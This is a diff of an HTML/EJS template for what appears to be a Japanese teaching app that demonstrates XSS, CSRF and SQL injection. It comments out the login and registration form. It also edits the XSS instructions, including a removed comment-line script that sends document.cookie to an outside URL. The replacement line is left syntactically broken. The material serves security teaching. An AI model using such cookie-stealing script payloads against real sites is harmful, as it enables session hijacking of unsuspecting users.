@@ -5,15 +5,16 @@
             <div>
                 <h2>実行手順</h2>
                 <ol>
-                    <li>
-                        ユーザー登録を行う。この時クッキーが付与される
-                    </li>
+<!--                     FIXME: XSSでは利用しないためコメントアウト-->
+<!--                    <li>-->
+<!--                        ユーザー登録を行う。この時クッキーが付与される-->
+<!--                    </li>-->
                     <li>
                         ユーザー登録のemailで、JSを実行する（JSのコードはindex.ejsのコメントにかかれている）
-                        <!-- <script> window.onload=function(){ location.href="https://www.google.com?" + document.cookie; }; </script>-->
+                        <!-- <script> window.onload=function(){ location.href="https://www.google.com }; </script>-->
                     </li>
                     <li>
-                        https://www.google.com/?cookie=hoge が出れば成功。クッキーを取得できた
+                        https://www.google.com/が出れば成功となる。罠サイトに誘導（参考：<a href="http://www.ne.senshu-u.ac.jp/~proj28-19/tasa/xss/xss2.html">XSS攻撃体験サイト</a>）
                     </li>
                 </ol>
             </div>
@@ -44,16 +45,20 @@
                     <% }); %>
                 </table>
             </div>
-            <div>
-                <h2>ログイン</h2>
-                <form action="/login" method="POST">
-                    <label>
-                        id(email)<input type="text" name="email" required><br>
-                        password<input type="text" name="password" required>
-                    </label><br>
-                    <button type="submit">送信</button>
-                </form>
-            </div>
+            <!--                     FIXME: XSSでは利用しないためコメントアウト-->
+<!--            <div>-->
+<!--                <h2>ログイン</h2>-->
+<!--                <form action="/login" method="POST">-->
+<!--                    <label>-->
+<!--                        id(email)<input type="text" name="email" required><br>-->
+<!--                        password<input type="text" name="password" required>-->
+<!--                    </label><br>-->
+<!--                    <button type="submit">送信</button>-->
+<!--                </form>-->
+<!--            </div>-->
+        </div>
+        <div>
+            <h1>CSRF</h1>
         </div>
         <div>
             <h1>SQL Injection</h1>
